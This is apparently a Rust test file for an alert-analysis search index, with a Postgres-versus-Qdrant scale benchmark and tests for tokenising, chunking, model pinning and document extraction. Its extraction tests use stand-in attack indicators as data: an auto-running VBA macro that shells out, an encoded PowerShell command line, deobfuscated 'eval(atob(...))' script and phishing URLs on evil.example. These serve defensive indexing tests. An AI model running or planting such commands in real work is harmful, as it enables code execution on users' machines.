    let alerts: usize = std::env::var("ACE_RS_SEARCH_SCALE_ALERTS")
        .ok()
        .and_then(|n| n.parse().ok())
        .unwrap_or(26_000);
    let per_alert: usize = std::env::var("ACE_RS_SEARCH_SCALE_CHUNKS_PER_ALERT")
        .ok()
        .and_then(|n| n.parse().ok())
        .unwrap_or(6);
    let clusters = 500;
    let vocabulary = 20_000;
    let test_db = TestDb::new().await;
    let db = test_db.db().clone();
    let pg = PgIndex::new(db.clone(), None, model());
    let url = std::env::var(QDRANT_VAR).unwrap_or_else(|_| panic!("{QDRANT_VAR} names a Qdrant"));
    let collection = format!("ace-rs-scale-{}", &Uuid::new_v4().simple().to_string()[..8]);
    let qdrant = QdrantIndex::create(&url, &collection, pg.clone(), db.clone())
        .await
        .expect("a collection");

    let mut numbers = Numbers(0x9E37_79B9_7F4A_7C15);
    let centers: Vec<Vec<f32>> = (0..clusters)
        .map(|_| normalized((0..DIMENSIONS).map(|_| numbers.normal()).collect()))
        .collect();
    let member = |numbers: &mut Numbers, cluster: usize| -> Vec<f32> {
        // a member of a cluster is about 0.6 from another by cosine
        normalized(
            centers[cluster]
                .iter()
                .map(|center| center + 0.8 * numbers.normal() / (DIMENSIONS as f32).sqrt())
                .collect(),
        )
    };
    // words whose use falls off as a real vocabulary's does
    let word = |numbers: &mut Numbers| -> String {
        let r = numbers.unit();
        format!(
            "w{}",
            ((vocabulary as f32).powf(r) as usize).min(vocabulary - 1)
        )
    };

    let roots: Vec<Uuid> = (0..alerts).map(|_| Uuid::new_v4()).collect();
    for batch in roots.chunks(5000) {
        sqlx::query(
            "INSERT INTO analysis.roots (id, analysis_mode, description, event_time_source, alerted_at)
             SELECT id, 'correlation', 'a synthetic alert', 'unset', now() - random() * interval '365 days'
             FROM unnest($1::uuid[]) AS t(id)",
        )
        .bind(batch)
        .execute(db.pool())
        .await
        .expect("roots");
    }

    let mut pg_seconds = 0.0;
    let mut qdrant_seconds = 0.0;
    let mut written = 0usize;
    for batch in roots.chunks(250) {
        let mut ids = Vec::new();
        let mut chunk_numbers = Vec::new();
        let mut texts = Vec::new();
        let mut vectors: Vec<String> = Vec::new();
        let mut terms = Vec::new();
        let mut points = Vec::new();
        for root in batch {
            let cluster = numbers.below(clusters);
            for chunk in 0..per_alert {
                let vector = member(&mut numbers, cluster);
                let text: String = (0..100)
                    .map(|_| word(&mut numbers))
                    .collect::<Vec<_>>()
                    .join(" ");
                let weights = sparse::term_weights(&text);
                points.push(json!({
                    "id": crate::qdrant::point_id(*root, "analysis", "1", i32::try_from(chunk).expect("small")).to_string(),
                    "vector": {"dense": vector, "sparse": {
                        "indices": weights.iter().map(|(index, _)| *index).collect::<Vec<_>>(),
                        "values": weights.iter().map(|(_, weight)| *weight).collect::<Vec<_>>(),
                    }},
                    "payload": {"root_uuid": root.to_string(), "kind": "analysis", "key": "1", "chunk": chunk,
                                "text": text, "queue": "default", "disposition": "OPEN"},
                }));
                ids.push(*root);
                chunk_numbers.push(i32::try_from(chunk).expect("small"));
                vectors.push(format!(
                    "[{}]",
                    vector
                        .iter()
                        .map(f32::to_string)
                        .collect::<Vec<_>>()
                        .join(",")
                ));
                terms.push(sparse::tsvector_text(&text));
                texts.push(text);
            }
        }
        written += ids.len();
        let started = Instant::now();
        sqlx::query(
            "INSERT INTO search.chunks (root_id, kind, key, chunk, text, embedding, terms)
             SELECT id, 'analysis', '1', n, text, embedding::vector, terms::tsvector
             FROM unnest($1::uuid[], $2::integer[], $3::text[], $4::text[], $5::text[])
                  AS t(id, n, text, embedding, terms)",
        )
        .bind(&ids)
        .bind(&chunk_numbers)
        .bind(&texts)
        .bind(&vectors)
        .bind(&terms)
        .execute(db.pool())
        .await
        .expect("chunks");
        pg_seconds += started.elapsed().as_secs_f64();
        let started = Instant::now();
        qdrant
            .call(
                reqwest::Method::PUT,
                "/points?wait=true",
                json!({"points": points}),
            )
            .await
            .expect("points");
        qdrant_seconds += started.elapsed().as_secs_f64();
    }
    sqlx::query("ANALYZE search.chunks")
        .execute(db.pool())
        .await
        .expect("analyzed");
    // Qdrant builds its vector index after the writes: wait until it says the collection is ready
    let waiting = Instant::now();
    loop {
        let info = qdrant.info().await.expect("info");
        if info["result"]["status"] == "green" || waiting.elapsed().as_secs() > 900 {
            println!(
                "scale\tqdrant\tstatus {} after {:.0} s more; indexed vectors {}; segments {}",
                info["result"]["status"],
                waiting.elapsed().as_secs_f64(),
                info["result"]["indexed_vectors_count"],
                info["result"]["segments_count"],
            );
            break;
        }
        tokio::time::sleep(std::time::Duration::from_secs(2)).await;
    }
    qdrant_seconds += waiting.elapsed().as_secs_f64();
    println!("scale\tchunks\t{written}\talerts\t{alerts}");
    println!("scale\twrite seconds\tpostgres {pg_seconds:.1}\tqdrant {qdrant_seconds:.1}");
    let sizes = sqlx::query_as::<_, (i64, i64, i64, i64)>(
        "SELECT pg_total_relation_size('search.chunks'), pg_relation_size('search.chunks_by_embedding'),
                pg_relation_size('search.chunks_by_terms'), pg_table_size('search.chunks')",
    )
    .fetch_one(db.pool())
    .await
    .expect("sizes");
    println!(
        "scale\tpostgres bytes\ttotal {}\thnsw index {}\tgin index {}\ttable with toast {}",
        sizes.0, sizes.1, sizes.2, sizes.3
    );

    // the dense lane's plan, for the record
    {
        let cluster = numbers.below(clusters);
        let vector = member(&mut numbers, cluster);
        let literal = format!(
            "{{{}}}",
            vector
                .iter()
                .map(f32::to_string)
                .collect::<Vec<_>>()
                .join(",")
        );
        let mut tx = db.begin().await.expect("begins");
        sqlx::raw_sql(
            "SET LOCAL hnsw.ef_search = 1000; SET LOCAL hnsw.iterative_scan = strict_order;
             SET LOCAL enable_seqscan = off; SET LOCAL enable_hashjoin = off; SET LOCAL enable_mergejoin = off;
             PREPARE dense_plan(real[]) AS
             SELECT c.root_id, 1 - (c.embedding <=> $1::real[]::vector) AS score
             FROM search.chunks c JOIN analysis.roots r ON r.id = c.root_id
             WHERE r.alerted_at IS NOT NULL AND r.queue::text <> ALL ('{svs}'::text[])
             ORDER BY c.embedding <=> $1::real[]::vector LIMIT 600",
        )
        .execute(tx.conn())
        .await
        .expect("set");
        // a test's own numbers, formatted by the test: nothing here is input
        let plan: Vec<String> = sqlx::query_scalar(sqlx::AssertSqlSafe(format!(
            "EXPLAIN (ANALYZE, BUFFERS, COSTS OFF) EXECUTE dense_plan('{literal}')"
        )))
        .fetch_all(tx.conn())
        .await
        .expect("explained");
        for line in plan {
            if !line.contains("Order By") && !line.contains("Sort Key") {
                println!("scale\tplan\t{line}");
            }
        }
        tx.rollback().await.expect("rolled back");
    }
    let scope = Scoped::default();
    let narrowed = Scoped {
        not_queues: Some(vec!["svs".to_owned()]),
        ..Scoped::default()
    };
    let mut timings: BTreeMap<&str, Vec<f64>> = BTreeMap::new();
    let mut found: BTreeMap<&str, usize> = BTreeMap::new();
    for _ in 0..50 {
        let cluster = numbers.below(clusters);
        let vector = member(&mut numbers, cluster);
        let text: String = (0..4)
            .map(|_| word(&mut numbers))
            .collect::<Vec<_>>()
            .join(" ");
        let weights = sparse::term_weights(&text);
        let sparse_query = json!({
            "indices": weights.iter().map(|(index, _)| *index).collect::<Vec<_>>(),
            "values": weights.iter().map(|(_, weight)| *weight).collect::<Vec<_>>(),
        });
        for (name, scope) in [("dense", &scope), ("dense, queue filter", &narrowed)] {
            let started = Instant::now();
            let lane = pg
                .nearest(vector.clone(), scope, 100, 3, 0.3)
                .await
                .expect("searched");
            timings
                .entry(if name == "dense" {
                    "postgres dense"
                } else {
                    "postgres dense, queue filter"
                })
                .or_default()
                .push(started.elapsed().as_secs_f64() * 1000.0);
            *found
                .entry(if name == "dense" {
                    "postgres dense"
                } else {
                    "postgres dense, queue filter"
                })
                .or_default() += lane.len();
            let started = Instant::now();
            let lane = qdrant
                .grouped(json!(vector), "dense", scope, 100, 3, Some(0.3))
                .await
                .expect("searched");
            timings
                .entry(if name == "dense" {
                    "qdrant dense"
                } else {
                    "qdrant dense, queue filter"
                })
                .or_default()
                .push(started.elapsed().as_secs_f64() * 1000.0);
            *found
                .entry(if name == "dense" {
                    "qdrant dense"
                } else {
                    "qdrant dense, queue filter"
                })
                .or_default() += lane.len();
        }
        let started = Instant::now();
        let lane = pg
            .sparse_lane(&text, &scope, 100, 3)
            .await
            .expect("searched")
            .expect("terms");
        timings
            .entry("postgres sparse")
            .or_default()
            .push(started.elapsed().as_secs_f64() * 1000.0);
        *found.entry("postgres sparse").or_default() += lane.len();
        let started = Instant::now();
        let lane = qdrant
            .grouped(sparse_query, "sparse", &scope, 100, 3, None)
            .await
            .expect("searched");
        timings
            .entry("qdrant sparse")
            .or_default()
            .push(started.elapsed().as_secs_f64() * 1000.0);
        *found.entry("qdrant sparse").or_default() += lane.len();
    }
    println!("scale\tlane\tmedian ms\tp95 ms\tmax ms\talerts found per query");
    for (name, mut times) in timings {
        times.sort_by(f64::total_cmp);
        println!(
            "scale\t{name}\t{:.1}\t{:.1}\t{:.1}\t{:.1}",
            percentile(&times, 0.5),
            percentile(&times, 0.95),
            times[times.len() - 1],
            found[name] as f64 / times.len() as f64,
        );
        assert!(found[name] > 0, "{name} found nothing");
    }
    if std::env::var("ACE_RS_SEARCH_SCALE_HOLD").is_ok() {
        // for reading the containers' memory and disk from outside before the data goes
        println!("scale\tholding 120 seconds for outside measurements");
        tokio::time::sleep(std::time::Duration::from_secs(120)).await;
    }
    qdrant.drop_collection().await.expect("dropped");
}

// ---------------------------------------------------------------------------------------------------
// ace3's `tests/saq/search/` cases that are the index's, each named in the test that holds it.
// ---------------------------------------------------------------------------------------------------

/// ace3's `TestSparse`.
#[test]
fn sparse_cases() {
    // test_identifiers_are_kept_whole
    let tokens = sparse::lexical_tokens(
        "mail from Bob@Example.com via https://evil.example/login?x=1 to 10.20.30.40",
    );
    for whole in [
        "bob@example.com",
        "https://evil.example/login?x=1",
        "10.20.30.40",
    ] {
        assert!(
            tokens.iter().any(|token| token == whole),
            "{whole}: {tokens:?}"
        );
    }
    // test_identifiers_are_also_split_into_parts
    for part in ["bob", "example", "evil", "login"] {
        assert!(
            tokens.iter().any(|token| token == part),
            "{part}: {tokens:?}"
        );
    }
    // test_ipv4_octets_are_not_emitted_as_words: an octet under two characters isn't a term
    let tokens = sparse::lexical_tokens("1.2.3.4");
    assert_eq!(tokens, vec!["1.2.3.4".to_owned()]);
    // test_hashes_are_identifiers
    assert_eq!(sparse::identifiers(SHA256_HEX), vec![SHA256_HEX.to_owned()]);
    assert_eq!(
        sparse::identifiers("d41d8cd98f00b204e9800998ecf8427e"),
        vec!["d41d8cd98f00b204e9800998ecf8427e".to_owned()]
    );
    // test_token_index_is_deterministic_u32: ace3's values, BLAKE2b's first four bytes
    assert_eq!(
        sparse::token_index("docusign"),
        sparse::token_index("docusign")
    );
    assert_ne!(
        sparse::token_index("docusign"),
        sparse::token_index("docusigm")
    );
    // test_weights_saturate
    let weight = |text: &str| sparse::term_weights(text)[0].1;
    let (once, twice, often) = (
        weight("invoice"),
        weight("invoice invoice"),
        weight(&"invoice ".repeat(100)),
    );
    assert!(once < twice && twice < often && often < 1.0);
    assert!((once - 1.0 / 2.2).abs() < 1e-12);
    // test_sparse_vector_is_sorted_and_unique
    let weights = sparse::term_weights("zebra apple zebra mango apple");
    assert_eq!(weights.len(), 3);
    assert!(weights.windows(2).all(|pair| pair[0].0 < pair[1].0));
    // test_empty_text
    assert!(sparse::term_weights("").is_empty());
    assert!(sparse::query_terms("   ").is_empty());
    assert_eq!(sparse::tsvector_text(""), "");
    // test_stopwords_are_dropped_but_identifiers_never_are
    assert!(sparse::lexical_tokens("the and of to").is_empty());
    assert_eq!(
        sparse::lexical_tokens("the.com"),
        vec!["the.com".to_owned(), "the".to_owned(), "com".to_owned()]
    );
    // a tsvector's text is lexemes of eight hex digits with a position for each time the term is there
    let vector = sparse::tsvector_text("invoice invoice docusign");
    let lexeme = |term: &str| sparse::lexeme(sparse::token_index(term));
    assert!(
        vector.contains(&format!("'{}':", lexeme("docusign"))),
        "{vector}"
    );
    let invoice = vector
        .split(' ')
        .find(|part| part.starts_with(&format!("'{}':", lexeme("invoice"))))
        .expect("the term");
    assert_eq!(invoice.matches(',').count(), 1, "two positions: {invoice}");
    assert!(
        vector
            .chars()
            .all(|c| c.is_ascii_hexdigit() || "':, ".contains(c))
    );
    // a query's terms are its first, in the order they appear, bounded
    let many: String = (0..200).map(|n| format!("word{n} ")).collect();
    assert_eq!(sparse::query_terms(&many).len(), sparse::MAX_QUERY_TERMS);
    assert_eq!(
        sparse::query_terms("docusign invoice docusign")[0].0,
        sparse::token_index("docusign")
    );
}

/// One token for each run of characters that aren't spaces: ace3's `WhitespaceTokenizer`.
fn words(text: &str) -> Vec<(usize, usize)> {
    let mut offsets = Vec::new();
    let mut start = None;
    for (at, c) in text.char_indices() {
        match (c.is_whitespace(), start) {
            (false, None) => start = Some(at),
            (true, Some(from)) => {
                offsets.push((from, at));
                start = None;
            }
            _ => {}
        }
    }
    if let Some(from) = start {
        offsets.push((from, text.len()));
    }
    offsets
}

/// ace3's `TestChunking`.
#[test]
fn chunking_cases() {
    let chunk = |text: &str, tokens, overlap, max, title| {
        let text = trimmed(text);
        chunk_text(text, &words(text), tokens, overlap, max, title)
    };
    // test_short_text_is_one_chunk
    let chunks = chunk("a short document", 8, 2, 4, None).expect("chunked");
    assert_eq!(chunks.len(), 1);
    assert_eq!(
        (
            chunks[0].index,
            chunks[0].text.as_str(),
            chunks[0].token_count
        ),
        (0, "a short document", 3)
    );
    // test_windows_overlap_and_slice_original_text: the text between tokens is kept as written
    let text = "one  two three four five six seven eight nine ten eleven twelve";
    let chunks = chunk(text, 8, 2, 4, None).expect("chunked");
    assert_eq!(chunks.len(), 2);
    assert_eq!(chunks[0].text, "one  two three four five six seven eight");
    assert_eq!(chunks[1].text, "seven eight nine ten eleven twelve");
    assert_eq!(chunks[1].token_count, 6);
    // test_max_chunks_truncates
    let long: String = (0..100).map(|n| format!("w{n} ")).collect();
    let chunks = chunk(&long, 8, 2, 4, None).expect("chunked");
    assert_eq!(chunks.len(), 4);
    assert_eq!(
        chunks.iter().map(|c| c.index).collect::<Vec<_>>(),
        vec![0, 1, 2, 3]
    );
    // test_title_on_first_chunk_only
    let chunks = chunk(text, 8, 2, 4, Some("Subject")).expect("chunked");
    assert!(chunks[0].text.starts_with("Subject\none  two"));
    assert!(!chunks[1].text.contains("Subject"));
    // test_empty_and_whitespace
    assert!(
        chunk("", 8, 2, 4, Some("Subject"))
            .expect("chunked")
            .is_empty()
    );
    assert!(chunk("  \n\t ", 8, 2, 4, None).expect("chunked").is_empty());
    // test_invalid_overlap
    assert!(chunk(text, 8, 8, 4, None).is_err());
    assert!(chunk(text, 0, 0, 4, None).is_err());
    // the model's own limit holds whatever is configured
    assert_eq!(crate::model::max_chunk_tokens(200), 200);
    assert_eq!(
        crate::model::max_chunk_tokens(4000),
        MAX_SEQUENCE_TOKENS - 2
    );
    assert_eq!(crate::model::max_chunk_tokens(0), 1);
}

/// The model's files are the pinned ones or nothing loads: ace3's `test_model.py` is its download, with
/// its lock and its staging directory, which ace-rs has none of.
#[test]
fn the_model_loads_only_its_pinned_files() {
    let pinned = std::path::PathBuf::from(std::env::var(MODEL_VAR).expect("the dev image sets it"));
    let copy = tempfile::tempdir().expect("a directory");
    for (name, _) in crate::model::MODEL_FILES {
        // links, not copies: the weights are 91 MB
        std::os::unix::fs::symlink(pinned.join(name), copy.path().join(name)).expect("linked");
    }
    Model::load(copy.path()).expect("the pinned files load from anywhere");
    // one byte more in the smallest file
    std::fs::remove_file(copy.path().join("config.json")).expect("removed");
    let mut config = std::fs::read(pinned.join("config.json")).expect("read");
    config.push(b'\n');
    std::fs::write(copy.path().join("config.json"), config).expect("written");
    let refused = Model::load(copy.path()).expect_err("refused");
    assert!(
        matches!(refused, crate::model::ModelError::Hash { .. }),
        "{refused}"
    );
    assert!(refused.to_string().contains("isn't the pinned file"));
    // a file that isn't there
    std::fs::remove_file(copy.path().join("config.json")).expect("removed");
    let refused = Model::load(copy.path()).expect_err("refused");
    assert!(
        matches!(refused, crate::model::ModelError::Read { .. }),
        "{refused}"
    );
    // the hashes are of the repository's files at the pinned commit
    assert_eq!(crate::model::MODEL_REVISION.len(), 40);
    assert!(
        crate::model::MODEL_FILES
            .iter()
            .all(|(_, hash)| hash.len() == 64)
    );
}

struct Tree {
    _test_db: TestDb,
    _cache: tempfile::TempDir,
    db: ace_core::Db,
    bucket: Bucket,
    pg: PgIndex,
}

async fn tree() -> Tree {
    let test_db = TestDb::new().await;
    let db = test_db.db().clone();
    let cache = tempfile::tempdir().expect("a cache directory");
    let store = Store::new(
        &BucketConfig::from_env().expect("the ACE_RS_BUCKET_* variables"),
        NodeCache::new(cache.path(), 1 << 30).expect("a cache"),
    )
    .await;
    let bucket = Bucket::new(db.clone(), store, BucketSettings::default());
    let pg = PgIndex::new(db.clone(), Some(bucket.clone()), model());
    Tree {
        _test_db: test_db,
        _cache: cache,
        db,
        bucket,
        pg,
    }
}

impl Tree {
    async fn documents(
        &self,
        root: Uuid,
        bounds: &crate::documents::Bounds,
    ) -> crate::documents::Extracted {
        crate::documents::extract(&self.db, Some(&self.bucket), root, &[], bounds)
            .await
            .expect("extracted")
    }

    async fn chunk_rows(&self, root: Uuid) -> Vec<(String, String, i32, String)> {
        sqlx::query_as("SELECT kind, key, chunk, text FROM search.chunks WHERE root_id = $1 ORDER BY kind, key, chunk")
            .bind(root)
            .fetch_all(self.db.pool())
            .await
            .expect("read")
    }
}

/// ace3's `test_documents.py`.
#[tokio::test(flavor = "multi_thread")]
async fn documents_cases() {
    use crate::documents::{Bounds, html_text, normalize_text, strip_leading_comments};

    // test_normalize_text
    assert_eq!(normalize_text("  a \t b\r\n\n\n  c  \n \n"), "a b\nc");
    assert_eq!(normalize_text(""), "");
    // test_deobfuscated_script_banner_is_stripped
    assert_eq!(
        strip_leading_comments("// source: a.js\n\n// pass 1\nvar x = 1;\n// kept\n"),
        "var x = 1;\n// kept"
    );
    // an HTML body's text
    let html = html_text(
        "<html><head><style>p{color:red}</style><script>alert(1)</script></head><body><p>Dear &amp; valued<br>customer</p><!-- hidden --></body></html>",
    );
    assert_eq!(normalize_text(&html), "Dear & valued\ncustomer");

    let t = tree().await;
    let bounds = Bounds::default();
    let (db, bucket) = (&t.db, &t.bucket);

    // test_alert_document_from_root, test_alert_document_prefers_alert_row: the description leads and
    // isn't an embedded title, and what the submitter recorded follows
    let root = insert_alert(
        db,
        "Suspicious  email -\n\n DocuSign invoice",
        "phish",
        "default",
        1,
    )
    .await;
    let extracted = t.documents(root, &bounds).await;
    assert_eq!(extracted.skipped, None);
    let header = &extracted.documents[0];
    assert_eq!((header.kind, header.key.as_str()), ("alert", "header"));
    assert_eq!(
        header.text,
        "Suspicious email -\nDocuSign invoice\nalert type: phish\ntool: test_tool"
    );
    assert!(!header.embed_title);
    assert_eq!(
        extracted.documents.len(),
        1,
        "test_no_per_edge_records: nothing for an alert with no text"
    );

    // test_detection_document_dedupes, and test_no_per_edge_records: observables make no document
    let address = insert_observable(db, root, "ipv4", "10.20.30.40", &["tagged"]).await;
    for description in ["matched rule A", "matched  rule A", "matched rule B", ""] {
        insert_detection(db, root, address, description).await;
    }
    let extracted = t.documents(root, &bounds).await;
    assert_eq!(extracted.documents.len(), 2);
    let detections = &extracted.documents[1];
    assert_eq!(
        (detections.kind, detections.key.as_str()),
        ("detection", "detections")
    );
    assert_eq!(detections.text, "matched rule A\nmatched rule B");
    assert_eq!(detections.title.as_deref(), Some("detections"));
    assert!(!detections.embed_title);

    // test_comment_documents_skip_empty
    assert!(Document::comment("1", Some("alice"), "  \n ").is_none());
    let comment = Document::comment("7", Some("alice"), " a  comment ").expect("a comment");
    assert_eq!(
        (comment.kind, comment.key.as_str(), comment.text.as_str()),
        ("comment", "7", "a comment")
    );
    let with = crate::documents::extract(
        db,
        Some(bucket),
        root,
        std::slice::from_ref(&comment),
        &bounds,
    )
    .await
    .expect("extracted");
    assert_eq!(
        with.documents[1], comment,
        "after the header, before the detections"
    );

    // test_email_extractor: the headers an analyst searches by, then the plain body, titled by its subject
    let root = insert_alert(db, "an email", "phish", "default", 2).await;
    email(
        db,
        bucket,
        root,
        "billing@docusign-invoices.example",
        "bob@example.com",
        "Your invoice",
        "Please  review\n\nthe invoice.",
    )
    .await;
    sqlx::query(
        "UPDATE analysis.results SET details = jsonb_set(details, '{email,headers}',
             '[[\"Date\", \"Mon, 5 Oct 2026 10:00:00 +0000\"], [\"X-Mailer\", \"evil 1.0\"], [\"Return-Path\", \"<bounce@example.net>\"]]')
         WHERE root_id = $1",
    )
    .bind(root)
    .execute(db.pool())
    .await
    .expect("headers");
    let extracted = t.documents(root, &bounds).await;
    let document = extracted
        .documents
        .iter()
        .find(|d| d.kind == "analysis")
        .expect("the email");
    assert_eq!(document.title.as_deref(), Some("Your invoice"));
    assert!(document.embed_title);
    assert_eq!(
        document.text,
        "From: billing@docusign-invoices.example\nTo: bob@example.com\nSubject: Your invoice\n\
         Date: Mon, 5 Oct 2026 10:00:00 +0000\nReturn-Path: <bounce@example.net>\nPlease review\nthe invoice."
    );
    assert!(document.result_id.is_some() && document.observable_id.is_some());
    assert_eq!(
        document.key,
        document.result_id.expect("a result").to_string()
    );

    // test_email_extractor_falls_back_to_the_html_body, test_email_extractor_without_a_body
    let root = insert_alert(db, "an html email", "phish", "default", 3).await;
    let message =
        insert_added_file(db, bucket, root, None, "m.rfc822", b"an html message", &[]).await;
    let result = insert_result(db, root, message, "email_analysis",
        json!({"parsing_error": null, "extraction_errors": [], "email": {"from": "a@example.com", "subject": "Hello"}})).await;
    insert_added_file(
        db,
        bucket,
        root,
        Some(result),
        "m.rfc822.unknown_text_html_000",
        b"<html><body><b>Click</b> the <a href=\"https://evil.example\">link</a></body></html>",
        &[],
    )
    .await;
    let extracted = t.documents(root, &bounds).await;
    let document = extracted
        .documents
        .iter()
        .find(|d| d.kind == "analysis")
        .expect("the email");
    assert_eq!(
        document.text,
        "From: a@example.com\nSubject: Hello\nClick\nthe\nlink"
    );
    let root = insert_alert(db, "a bodiless email", "phish", "default", 4).await;
    let message = insert_added_file(
        db,
        bucket,
        root,
        None,
        "b.rfc822",
        b"a bodiless message",
        &[],
    )
    .await;
    insert_result(
        db,
        root,
        message,
        "email_analysis",
        json!({"email": {"from": "a@example.com", "decoded_subject": "Only headers"}}),
    )
    .await;
    let extracted = t.documents(root, &bounds).await;
    let document = extracted
        .documents
        .iter()
        .find(|d| d.kind == "analysis")
        .expect("the email");
    assert_eq!(document.text, "From: a@example.com\nSubject: Only headers");
    // an email analysis that parsed nothing makes no document
    let root = insert_alert(db, "an unparsed email", "phish", "default", 5).await;
    let message = insert_added_file(
        db,
        bucket,
        root,
        None,
        "u.rfc822",
        b"an unparsed message",
        &[],
    )
    .await;
    insert_result(
        db,
        root,
        message,
        "email_analysis",
        json!({"parsing_error": "not an email", "email": null}),
    )
    .await;
    assert!(
        t.documents(root, &bounds)
            .await
            .documents
            .iter()
            .all(|d| d.kind != "analysis")
    );

    // the rest of ace3's extractors, each on a result of its type
    let root = insert_alert(db, "every extractor", "edr", "default", 6).await;
    // test_command_line_extractor
    let command = insert_observable(
        db,
        root,
        "command_line",
        "powershell.exe -enc AAAA c:\\temp\\a.ps1",
        &[],
    )
    .await;
    let command_result = insert_result(
        db,
        root,
        command,
        "command_line_analysis",
        json!({"file_paths": ["c:\\temp\\a.ps1", ""]}),
    )
    .await;
    // test_qrcode_extractor_and_byte_cap
    let image = insert_added_file(db, bucket, root, None, "qr.png", b"png bytes 2", &[]).await;
    let qr = insert_result(
        db,
        root,
        image,
        "qr_code_analysis",
        json!({"extracted_text": "https://mfa-reset.example/login"}),
    )
    .await;
    // test_olevba_extractor, test_olevba_extractor_without_code
    let office = insert_added_file(db, bucket, root, None, "invoice.doc", b"ole bytes", &[]).await;
    let vba = insert_result(db, root, office, "olevba_analysis",
        json!({"macros": [{"vba_code": "Sub AutoOpen()\nShell \"calc\"\nEnd Sub"}, {"vba_code": ""}, {"other": 1}]})).await;
    let empty = insert_added_file(db, bucket, root, None, "empty.doc", b"ole bytes 2", &[]).await;
    insert_result(
        db,
        root,
        empty,
        "olevba_analysis",
        json!({"macros": [{"vba_code": "  \n"}]}),
    )
    .await;
    // test_rdap_extractor: the registration's fields, since ace-rs keeps no WHOIS text
    let domain = insert_observable(db, root, "fqdn", "evil.example", &[]).await;
    let rdap = insert_result(db, root, domain, "rdap_analysis",
        json!({"domain_name": "evil.example", "registrar": "Bad Registrar LLC", "name_servers": ["ns1.evil.example"], "emails": [], "country": null})).await;
    // test_encrypted_attachment_email_body_extractor, for each of its four types
    let mut bodies = Vec::new();
    for (n, kind) in [
        "zip_encryption_analysis",
        "rar_encryption_analysis",
        "pdf_encryption_analysis",
        "msoffice_encryption_analysis",
    ]
    .iter()
    .enumerate()
    {
        let file = insert_added_file(
            db,
            bucket,
            root,
            None,
            &format!("locked{n}"),
            format!("locked {n}").as_bytes(),
            &[],
        )
        .await;
        bodies.push(
            insert_result(
                db,
                root,
                file,
                kind,
                json!({"email_body": format!("the password is hunter{n}")}),
            )
            .await,
        );
    }
    // test_xml_plain_text_extractor_reads_the_named_file
    let docx = insert_added_file(db, bucket, root, None, "report.docx", b"docx bytes", &[]).await;
    let xml = insert_result(
        db,
        root,
        docx,
        "xml_plain_text_analysis",
        json!({"xml_plain_text": "report.docx.noxml"}),
    )
    .await;
    insert_added_file(
        db,
        bucket,
        root,
        Some(xml),
        "report.docx.other",
        b"not the text",
        &[],
    )
    .await;
    insert_added_file(
        db,
        bucket,
        root,
        Some(xml),
        "report.docx.noxml",
        b"the document's text",
        &[],
    )
    .await;
    // test_ocr_extractor_reads_file_observable: the file its yara_meta marks
    let scan = insert_added_file(db, bucket, root, None, "scan.png", b"scan bytes", &[]).await;
    let ocr = insert_result(db, root, scan, "ocr_analysis", json!({"ocr": true})).await;
    insert_added_file(
        db,
        bucket,
        root,
        Some(ocr),
        "scan.png.ocr/scan.png.ocr",
        b"text read from the image",
        &["type=document.text.ocr"],
    )
    .await;
    // test_pdf_text_extractor_reads_the_output_file: named by its sha256
    let pdf = insert_added_file(db, bucket, root, None, "a.pdf", b"pdf bytes", &[]).await;
    let pdf_text = b"text pdftotext wrote";
    let pdf_sha = hex::encode(<sha2::Sha256 as sha2::Digest>::digest(pdf_text));
    let pdftotext = insert_result(
        db,
        root,
        pdf,
        "pdf_text_analysis",
        json!({"stdout": "", "stderr": "", "output_path": pdf_sha}),
    )
    .await;
    insert_added_file(
        db,
        bucket,
        root,
        Some(pdftotext),
        "a.pdf.txt",
        pdf_text,
        &["type=document.pdf.text"],
    )
    .await;
    // test_pdf_text_extractor_skips_empty_output
    let blank =
        insert_added_file(db, bucket, root, None, "blank.pdf", b"blank pdf bytes", &[]).await;
    let blank_result = insert_result(
        db,
        root,
        blank,
        "pdf_text_analysis",
        json!({"output_path": null}),
    )
    .await;
    insert_added_file(
        db,
        bucket,
        root,
        Some(blank_result),
        "blank.pdf.txt",
        b"  \n ",
        &[],
    )
    .await;
    // test_deobfuscated_script_extractor
    let script = insert_added_file(db, bucket, root, None, "a.js", b"js bytes", &[]).await;
    let js = insert_result(
        db,
        root,
        script,
        "javascript_deobfuscation_analysis",
        json!({"extracted_files": ["deobfuscated-a.js"]}),
    )
    .await;
    insert_added_file(
        db,
        bucket,
        root,
        Some(js),
        "a.js.out/deobfuscated-a.js",
        b"// source: a.js\n// passes: 3\neval(atob('x'));",
        &[],
    )
    .await;
    // an analysis type with no extractor makes nothing
    insert_result(
        db,
        root,
        domain,
        "dns_analysis",
        json!({"answers": ["a very searchable sentence"]}),
    )
    .await;

    let extracted = t.documents(root, &bounds).await;
    assert_eq!(extracted.left_out, 0);
    let by_result = |result: i64| {
        extracted
            .documents
            .iter()
            .find(|d| d.result_id == Some(result))
            .unwrap_or_else(|| panic!("no document for result {result}: {:?}", extracted.documents))
    };
    let labelled = |result: i64, label: &str, text: &str| {
        let document = by_result(result);
        assert_eq!(
            (document.title.as_deref(), document.text.as_str()),
            (Some(label), text)
        );
        assert!(!document.embed_title, "{label} is a label, not content");
    };
    labelled(
        command_result,
        "command line",
        "powershell.exe -enc AAAA c:\\temp\\a.ps1\nc:\\temp\\a.ps1",
    );
    labelled(qr, "QR code", "https://mfa-reset.example/login");
    labelled(vba, "VBA macro", "Sub AutoOpen()\nShell \"calc\"\nEnd Sub");
    labelled(
        rdap,
        "whois",
        "Domain: evil.example\nRegistrar: Bad Registrar LLC\nName servers: ns1.evil.example",
    );
    for (n, body) in bodies.iter().enumerate() {
        labelled(*body, "email body", &format!("the password is hunter{n}"));
    }
    labelled(xml, "document text", "the document's text");
    labelled(ocr, "OCR text", "text read from the image");
    labelled(pdftotext, "PDF text", "text pdftotext wrote");
    labelled(js, "deobfuscated script", "eval(atob('x'));");
    let kinds: Vec<&str> = extracted.documents.iter().map(|d| d.kind).collect();
    assert_eq!(
        kinds.iter().filter(|kind| **kind == "analysis").count(),
        12,
        "{:?}",
        extracted.documents
    );
    assert!(
        extracted
            .documents
            .iter()
            .all(|d| d.result_id != Some(blank_result))
    );
    assert!(
        extracted
            .documents
            .iter()
            .all(|d| !d.text.contains("searchable sentence"))
    );
    // the order is the header, then the results as they were written
    let ids: Vec<i64> = extracted
        .documents
        .iter()
        .filter_map(|d| d.result_id)
        .collect();
    assert!(ids.windows(2).all(|pair| pair[0] < pair[1]));

    // test_qrcode_extractor_and_byte_cap: a document is cut at the byte bound, on a character
    let capped = t
        .documents(
            root,
            &Bounds {
                max_document_bytes: 1024,
                ..Bounds::default()
            },
        )
        .await;
